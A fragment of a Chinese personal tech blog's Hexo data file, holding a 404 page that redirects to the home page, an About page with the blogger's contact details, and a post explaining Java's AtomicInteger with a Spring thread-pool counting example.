src=\"http://7xvfir.com1.z0.glb.clouddn.com/404/background.jpg\">\n    <div class=\"mask\"></div>\n</div>\n<div class=\"b\">\n\t\t<img src=\"http://7xvfir.com1.z0.glb.clouddn.com/404/404.png\" class=\"center\">\n\t\t<p>\n\t\t\t&#x6682;&#x65F6;&#x672A;&#x80FD;&#x627E;&#x5230;&#x60A8;&#x67E5;&#x627E;&#x7684;&#x9875;&#x9762;<br>\n\t\t\t&#x53EF;&#x80FD;&#x8F93;&#x5165;&#x7684;&#x7F51;&#x5740;&#x9519;&#x8BEF;&#x6216;&#x6B64;&#x9875;&#x9762;&#x4E0D;&#x5B58;&#x5728;<br>\n            <span id=\"num\"></span>&#x79D2;&#x540E;&#x81EA;&#x52A8;&#x8DF3;&#x8F6C;&#x5230;&#x4E3B;&#x9875;\n\t\t</p>\n\t</div>\n\n</body>\n</html>   ","excerpt":"","more":"\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>404&#x9875;&#x9762;</title>\n<style>\n*{margin:0;padding:0;outline:none;font-family:\\5FAE\\8F6F\\96C5\\9ED1,宋体;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-khtml-user-select:none;user-select:none;cursor:default;font-weight:lighter;}\n.center{margin:0 auto;}\n.whole{width:100%;height:100%;line-height:100%;position:fixed;bottom:0;left:0;z-index:-1000;overflow:hidden;}\n.whole img{width:100%;height:100%;}\n.mask{width:100%;height:100%;position:absolute;top:0;left:0;background:#000;opacity:0.6;filter:alpha(opacity=60);}\n.b{width:100%;text-align:center;height:400px;position:absolute;top:50%;margin-top:-230px}.a{width:150px;height:50px;margin-top:30px}.a a{display:block;float:left;width:150px;height:50px;background:#fff;text-align:center;line-height:50px;font-size:18px;border-radius:25px;color:#333}.a a:hover{color:#000;box-shadow:#fff 0 0 20px}\np{color:#fff;margin-top:40px;font-size:24px;}\n#num{margin:0 5px;font-weight:bold;}\n</style>\n<script type=\"text/javascript\">\n\tvar num=6;\n\tfunction redirect(){\n\t\tnum--;\n\t\tdocument.getElementById(\"num\").innerHTML=num;\n\t\tif(num<0){\n\t\t\tdocument.getElementById(\"num\").innerHTML=0;\n\t\t\tlocation.href=\"http://www.wangxin123.com\";\n\t\t\t}\n\t\t}\n\tsetInterval(\"redirect()\", 1000);\n</script>\n</head>\n\n<body onload=\"redirect();\">\n<div class=\"whole\">\n\t<img src=\"http://7xvfir.com1.z0.glb.clouddn.com/404/background.jpg\">\n    <div class=\"mask\"></div>\n</div>\n<div class=\"b\">\n\t\t<img src=\"http://7xvfir.com1.z0.glb.clouddn.com/404/404.png\" class=\"center\">\n\t\t<p>\n\t\t\t&#x6682;&#x65F6;&#x672A;&#x80FD;&#x627E;&#x5230;&#x60A8;&#x67E5;&#x627E;&#x7684;&#x9875;&#x9762;<br>\n\t\t\t&#x53EF;&#x80FD;&#x8F93;&#x5165;&#x7684;&#x7F51;&#x5740;&#x9519;&#x8BEF;&#x6216;&#x6B64;&#x9875;&#x9762;&#x4E0D;&#x5B58;&#x5728;<br>\n            <span id=\"num\"></span>&#x79D2;&#x540E;&#x81EA;&#x52A8;&#x8DF3;&#x8F6C;&#x5230;&#x4E3B;&#x9875;\n\t\t</p>\n\t</div>\n\n</body>\n</html>   "},{"title":"About","layout":"page","comments":0,"date":"2016-04-16T15:42:13.000Z","toc":false,"_content":"\n### 博主那些事儿\n\n- 工作地：大天朝\n- 工作单位：有关部门\n- 目前岗位：Web后端开发攻城狮\n- 兴趣爱好：折腾，记录，然后使劲折腾\n- 邮箱：wasim37@163.com、wasimV537@gmail.com\n\n* * *\n**如果文章对你有帮助，请用<font style=\"color:red;\"> 微信 </font>扫一扫随意打赏**\n<div style=\"text-align:center;width:320px;height:320px;\">![](http://7xvfir.com1.z0.glb.clouddn.com/about/wx.gif)</div>\n<br/>","source":"about/index.md","raw":"---\ntitle: \"About\"\nlayout: \"page\"\ncomments: false\ndate: 2016-4-16 23:42:13\ntoc: false\n\n---\n\n### 博主那些事儿\n\n- 工作地：大天朝\n- 工作单位：有关部门\n- 目前岗位：Web后端开发攻城狮\n- 兴趣爱好：折腾，记录，然后使劲折腾\n- 邮箱：wasim37@163.com、wasimV537@gmail.com\n\n* * *\n**如果文章对你有帮助，请用<font style=\"color:red;\"> 微信 </font>扫一扫随意打赏**\n<div style=\"text-align:center;width:320px;height:320px;\">![](http://7xvfir.com1.z0.glb.clouddn.com/about/wx.gif)</div>\n<br/>","updated":"2016-11-18T06:50:52.244Z","path":"about/index.html","_id":"ciwbrula10002gwtmj3yvj5gc","content":"<h3 id=\"&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;\"><a href=\"#&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;\" class=\"headerlink\" title=\"&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;\"></a>&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;</h3><ul>\n<li>&#x5DE5;&#x4F5C;&#x5730;&#xFF1A;&#x5927;&#x5929;&#x671D;</li>\n<li>&#x5DE5;&#x4F5C;&#x5355;&#x4F4D;&#xFF1A;&#x6709;&#x5173;&#x90E8;&#x95E8;</li>\n<li>&#x76EE;&#x524D;&#x5C97;&#x4F4D;&#xFF1A;Web&#x540E;&#x7AEF;&#x5F00;&#x53D1;&#x653B;&#x57CE;&#x72EE;</li>\n<li>&#x5174;&#x8DA3;&#x7231;&#x597D;&#xFF1A;&#x6298;&#x817E;&#xFF0C;&#x8BB0;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x52B2;&#x6298;&#x817E;</li>\n<li>&#x90AE;&#x7BB1;&#xFF1A;wasim37@163.com&#x3001;wasimV537@gmail.com</li>\n</ul>\n<hr>\n<p><strong>&#x5982;&#x679C;&#x6587;&#x7AE0;&#x5BF9;&#x4F60;&#x6709;&#x5E2E;&#x52A9;&#xFF0C;&#x8BF7;&#x7528;<font style=\"color:red;\"> &#x5FAE;&#x4FE1; </font>&#x626B;&#x4E00;&#x626B;&#x968F;&#x610F;&#x6253;&#x8D4F;</strong></p>\n<p><div style=\"text-align:center;width:320px;height:320px;\"><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/about/wx.gif\" alt=\"\"></div><br><br></p>\n","excerpt":"","more":"<h3 id=\"&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;\"><a href=\"#&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;\" class=\"headerlink\" title=\"&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;\"></a>&#x535A;&#x4E3B;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;</h3><ul>\n<li>&#x5DE5;&#x4F5C;&#x5730;&#xFF1A;&#x5927;&#x5929;&#x671D;</li>\n<li>&#x5DE5;&#x4F5C;&#x5355;&#x4F4D;&#xFF1A;&#x6709;&#x5173;&#x90E8;&#x95E8;</li>\n<li>&#x76EE;&#x524D;&#x5C97;&#x4F4D;&#xFF1A;Web&#x540E;&#x7AEF;&#x5F00;&#x53D1;&#x653B;&#x57CE;&#x72EE;</li>\n<li>&#x5174;&#x8DA3;&#x7231;&#x597D;&#xFF1A;&#x6298;&#x817E;&#xFF0C;&#x8BB0;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x52B2;&#x6298;&#x817E;</li>\n<li>&#x90AE;&#x7BB1;&#xFF1A;wasim37@163.com&#x3001;wasimV537@gmail.com</li>\n</ul>\n<hr>\n<p><strong>&#x5982;&#x679C;&#x6587;&#x7AE0;&#x5BF9;&#x4F60;&#x6709;&#x5E2E;&#x52A9;&#xFF0C;&#x8BF7;&#x7528;<font style=\"color:red;\"> &#x5FAE;&#x4FE1; </font>&#x626B;&#x4E00;&#x626B;&#x968F;&#x610F;&#x6253;&#x8D4F;</strong></p>\n<p><div style=\"text-align:center;width:320px;height:320px;\"><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/about/wx.gif\" alt=\"\"></div><br><br></p>\n"},{"title":"Categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: Categories\nlayout: \"categories\"\n---\n","date":"2016-11-18T06:53:47.941Z","updated":"2016-11-18T06:50:52.257Z","path":"categories/index.html","comments":1,"_id":"ciwbrula60004gwtm8mygf2gv","content":"","excerpt":"","more":""},{"title":"Tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: Tags\nlayout: \"tags\"\n---\n","date":"2016-11-18T06:53:47.943Z","updated":"2016-11-18T06:50:52.258Z","path":"tags/index.html","comments":1,"_id":"ciwbrulab0008gwtmdsvkmgww","content":"","excerpt":"","more":""}],"Post":[{"title":"AtomicInteger的使用","date":"2016-04-16T14:41:19.000Z","toc":false,"_content":"\n### JDK API 1.7相关介绍\n可以用原子方式更新的 int 值。有关原子变量属性的描述，请参阅 java.util.concurrent.atomic 包规范。AtomicInteger 可用在应用程序中（如以原子方式增加的计数器），并且不能用于替换 Integer。但是，此类确实扩展了 Number，允许那些处理基于数字类的工具和实用工具进行统一访问。\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/1.png)\n\n<!-- more -->\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/2.png)\n\n**AtomicInteger 是线程安全的，多线程对同一个数加100次，结果一定是100.  相关代码示例：**\n\n\n```\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.AtomicInteger;\n\nimport javax.annotation.PostConstruct;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;\nimport org.springframework.stereotype.Component;\n\n/**\n * @ClassName: AtomicIntegerHandle \n * @Description: AtomicInteger的使用\n * @author wasim\n * @create at 2015-8-12 下午8:44:51\n *  \n */\n@Component\npublic class AtomicIntegerHandle {\n\t\n\t@Autowired\n\tThreadPoolTaskExecutor executor;\n\t\n\t@PostConstruct\n\tpublic void handleQuestionKnowledge(){\n\t\t\n\t\tAtomicInteger atomicInteger = new AtomicInteger();\n\t\t\n\t\tint round = 15; //要执行的线程总数\n\t\t\n\t\t//导出文件 \n\t\texecutor.execute(new ExportStats(atomicInteger, round));\n\t\t\n\t\t//导出文件前，需要先循环下面12个线程\n\t\tfor(int i=0;i<round;i++){\n\t\t\texecutor.execute(new similarKnowledgeHandle(atomicInteger));\n\t\t}\n\t\t\n\t}\n\t\n\t\n\tpublic class similarKnowledgeHandle implements Runnable{\n\t\tAtomicInteger atomicInteger;\n\t\t\n\t\tpublic similarKnowledgeHandle(AtomicInteger atomicInteger) {\n\t\t\tthis.atomicInteger =atomicInteger;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\tSystem.out.println(\"do some thing....\");\n\t\t\tatomicInteger.getAndIncrement();\n\t\t\tSystem.out.println(atomicInteger.get()); //显示当前计数\n\t\t}\n\t}\n\t\n\t\n\tpublic class ExportStats implements Runnable{\n\t\t\n\t\tAtomicInteger atomicInteger;\n\t\tint round;\n\t\t\n\t\tpublic ExportStats(AtomicInteger atomicInteger, int round) {\n\t\t\tthis.atomicInteger =atomicInteger;\n\t\t\tthis.round = round;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\tboolean flag = true;\n\t\t\t\twhile(flag){\n\t\t\t\t\tif(atomicInteger.get() == round){\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tSystem.out.println(\"预处理完成,开始执行相关...\");\n\t\t\t\t\t} else {\n\t\t\t\t\t\tSystem.out.println(\"wait...\");\n\t\t\t\t\t\tThread.sleep(1000);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} catch (Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\t\n\t}\n}\n```\n","source":"_posts/AtomicInteger的使用.md","raw":"---\ntitle: AtomicInteger的使用\ncategories:\n  - WEB后端\ntags:\n  - concurrent\ndate: 2016-4-16 22:41:19\ntoc: false\n\n---\n\n### JDK API 1.7相关介绍\n可以用原子方式更新的 int 值。有关原子变量属性的描述，请参阅 java.util.concurrent.atomic 包规范。AtomicInteger 可用在应用程序中（如以原子方式增加的计数器），并且不能用于替换 Integer。但是，此类确实扩展了 Number，允许那些处理基于数字类的工具和实用工具进行统一访问。\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/1.png)\n\n<!-- more -->\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/2.png)\n\n**AtomicInteger 是线程安全的，多线程对同一个数加100次，结果一定是100.  相关代码示例：**\n\n\n```\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.AtomicInteger;\n\nimport javax.annotation.PostConstruct;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;\nimport org.springframework.stereotype.Component;\n\n/**\n * @ClassName: AtomicIntegerHandle \n * @Description: AtomicInteger的使用\n * @author wasim\n * @create at 2015-8-12 下午8:44:51\n *  \n */\n@Component\npublic class AtomicIntegerHandle {\n\t\n\t@Autowired\n\tThreadPoolTaskExecutor executor;\n\t\n\t@PostConstruct\n\tpublic void handleQuestionKnowledge(){\n\t\t\n\t\tAtomicInteger atomicInteger = new AtomicInteger();\n\t\t\n\t\tint round = 15; //要执行的线程总数\n\t\t\n\t\t//导出文件 \n\t\texecutor.execute(new ExportStats(atomicInteger, round));\n\t\t\n\t\t//导出文件前，需要先循环下面12个线程\n\t\tfor(int i=0;i<round;i++){\n\t\t\texecutor.execute(new similarKnowledgeHandle(atomicInteger));\n\t\t}\n\t\t\n\t}\n\t\n\t\n\tpublic class similarKnowledgeHandle implements Runnable{\n\t\tAtomicInteger atomicInteger;\n\t\t\n\t\tpublic similarKnowledgeHandle(AtomicInteger atomicInteger) {\n\t\t\tthis.atomicInteger =atomicInteger;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\tSystem.out.println(\"do some thing....\");\n\t\t\tatomicInteger.getAndIncrement();\n\t\t\tSystem.out.println(atomicInteger.get()); //显示当前计数\n\t\t}\n\t}\n\t\n\t\n\tpublic class ExportStats implements Runnable{\n\t\t\n\t\tAtomicInteger atomicInteger;\n\t\tint round;\n\t\t\n\t\tpublic ExportStats(AtomicInteger atomicInteger, int round) {\n\t\t\tthis.atomicInteger =atomicInteger;\n\t\t\tthis.round = round;\n\t\t}\n\t\t\n\t\t@Override\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\tboolean flag = true;\n\t\t\t\twhile(flag){\n\t\t\t\t\tif(atomicInteger.get() == round){\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tSystem.out.println(\"预处理完成,开始执行相关...\");\n\t\t\t\t\t} else {\n\t\t\t\t\t\tSystem.out.println(\"wait...\");\n\t\t\t\t\t\tThread.sleep(1000);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} catch (Exception e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\t\n\t}\n}\n```\n","slug":"AtomicInteger的使用","published":1,"updated":"2016-11-17T11:59:42.660Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrul9w0001gwtm4148x45m","content":"<h3 id=\"JDK-API-1-7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;\"><a href=\"#JDK-API-1-7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;\" class=\"headerlink\" title=\"JDK API 1.7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;\"></a>JDK API 1.7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;</h3><p>&#x53EF;&#x4EE5;&#x7528;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x66F4;&#x65B0;&#x7684; int &#x503C;&#x3002;&#x6709;&#x5173;&#x539F;&#x5B50;&#x53D8;&#x91CF;&#x5C5E;&#x6027;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; java.util.concurrent.atomic &#x5305;&#x89C4;&#x8303;&#x3002;AtomicInteger &#x53EF;&#x7528;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF08;&#x5982;&#x4EE5;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x589E;&#x52A0;&#x7684;&#x8BA1;&#x6570;&#x5668;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;&#x66FF;&#x6362; Integer&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x6B64;&#x7C7B;&#x786E;&#x5B9E;&#x6269;&#x5C55;&#x4E86; Number&#xFF0C;&#x5141;&#x8BB8;&#x90A3;&#x4E9B;&#x5904;&#x7406;&#x57FA;&#x4E8E;&#x6570;&#x5B57;&#x7C7B;&#x7684;&#x5DE5;&#x5177;&#x548C;&#x5B9E;&#x7528;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x8BBF;&#x95EE;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>\n<a id=\"more\"></a>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p><strong>AtomicInteger &#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x6570;&#x52A0;100&#x6B21;&#xFF0C;&#x7ED3;&#x679C;&#x4E00;&#x5B9A;&#x662F;100.  &#x76F8;&#x5173;&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A;</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.concurrent.CountDownLatch;</span><br><span class=\"line\">import java.util.concurrent.atomic.AtomicInteger;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.annotation.PostConstruct;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @ClassName: AtomicIntegerHandle </span><br><span class=\"line\"> * @Description: AtomicInteger&#x7684;&#x4F7F;&#x7528;</span><br><span class=\"line\"> * @author wasim</span><br><span class=\"line\"> * @create at 2015-8-12 &#x4E0B;&#x5348;8:44:51</span><br><span class=\"line\"> *  </span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class AtomicIntegerHandle {</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@Autowired</span><br><span class=\"line\">\tThreadPoolTaskExecutor executor;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@PostConstruct</span><br><span class=\"line\">\tpublic void handleQuestionKnowledge(){</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tAtomicInteger atomicInteger = new AtomicInteger();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tint round = 15; //&#x8981;&#x6267;&#x884C;&#x7684;&#x7EBF;&#x7A0B;&#x603B;&#x6570;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6; </span><br><span class=\"line\">\t\texecutor.execute(new ExportStats(atomicInteger, round));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5FAA;&#x73AF;&#x4E0B;&#x9762;12&#x4E2A;&#x7EBF;&#x7A0B;</span><br><span class=\"line\">\t\tfor(int i=0;i&lt;round;i++){</span><br><span class=\"line\">\t\t\texecutor.execute(new similarKnowledgeHandle(atomicInteger));</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class similarKnowledgeHandle implements Runnable{</span><br><span class=\"line\">\t\tAtomicInteger atomicInteger;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic similarKnowledgeHandle(AtomicInteger atomicInteger) {</span><br><span class=\"line\">\t\t\tthis.atomicInteger =atomicInteger;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\tSystem.out.println(&quot;do some thing....&quot;);</span><br><span class=\"line\">\t\t\tatomicInteger.getAndIncrement();</span><br><span class=\"line\">\t\t\tSystem.out.println(atomicInteger.get()); //&#x663E;&#x793A;&#x5F53;&#x524D;&#x8BA1;&#x6570;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class ExportStats implements Runnable{</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tAtomicInteger atomicInteger;</span><br><span class=\"line\">\t\tint round;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic ExportStats(AtomicInteger atomicInteger, int round) {</span><br><span class=\"line\">\t\t\tthis.atomicInteger =atomicInteger;</span><br><span class=\"line\">\t\t\tthis.round = round;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\ttry {</span><br><span class=\"line\">\t\t\t\tboolean flag = true;</span><br><span class=\"line\">\t\t\t\twhile(flag){</span><br><span class=\"line\">\t\t\t\t\tif(atomicInteger.get() == round){</span><br><span class=\"line\">\t\t\t\t\t\tflag = false;</span><br><span class=\"line\">\t\t\t\t\t\tSystem.out.println(&quot;&#x9884;&#x5904;&#x7406;&#x5B8C;&#x6210;,&#x5F00;&#x59CB;&#x6267;&#x884C;&#x76F8;&#x5173;...&quot;);</span><br><span class=\"line\">\t\t\t\t\t} else {</span><br><span class=\"line\">\t\t\t\t\t\tSystem.out.println(&quot;wait...&quot;);</span><br><span class=\"line\">\t\t\t\t\t\tThread.sleep(1000);</span><br><span class=\"line\">\t\t\t\t\t}</span><br><span class=\"line\">\t\t\t\t}</span><br><span class=\"line\">\t\t\t} catch (Exception e) {</span><br><span class=\"line\">\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t}</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n","excerpt":"<h3 id=\"JDK-API-1-7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;\"><a href=\"#JDK-API-1-7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;\" class=\"headerlink\" title=\"JDK API 1.7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;\"></a>JDK API 1.7&#x76F8;&#x5173;&#x4ECB;&#x7ECD;</h3><p>&#x53EF;&#x4EE5;&#x7528;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x66F4;&#x65B0;&#x7684; int &#x503C;&#x3002;&#x6709;&#x5173;&#x539F;&#x5B50;&#x53D8;&#x91CF;&#x5C5E;&#x6027;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x8BF7;&#x53C2;&#x9605; java.util.concurrent.atomic &#x5305;&#x89C4;&#x8303;&#x3002;AtomicInteger &#x53EF;&#x7528;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF08;&#x5982;&#x4EE5;&#x539F;&#x5B50;&#x65B9;&#x5F0F;&#x589E;&#x52A0;&#x7684;&#x8BA1;&#x6570;&#x5668;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;&#x66FF;&#x6362; Integer&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x6B64;&#x7C7B;&#x786E;&#x5B9E;&#x6269;&#x5C55;&#x4E86; Number&#xFF0C;&#x5141;&#x8BB8;&#x90A3;&#x4E9B;&#x5904;&#x7406;&#x57FA;&#x4E8E;&#x6570;&#x5B57;&#x7C7B;&#x7684;&#x5DE5;&#x5177;&#x548C;&#x5B9E;&#x7528;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x8BBF;&#x95EE;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>","more":"<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/AtomicInteger%E7%9A%84%E4%BD%BF%E7%94%A8/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p><strong>AtomicInteger &#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x6570;&#x52A0;100&#x6B21;&#xFF0C;&#x7ED3;&#x679C;&#x4E00;&#x5B9A;&#x662F;100.  &#x76F8;&#x5173;&#x4EE3;&#x7801;&#x793A;&#x4F8B;&#xFF1A;</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span 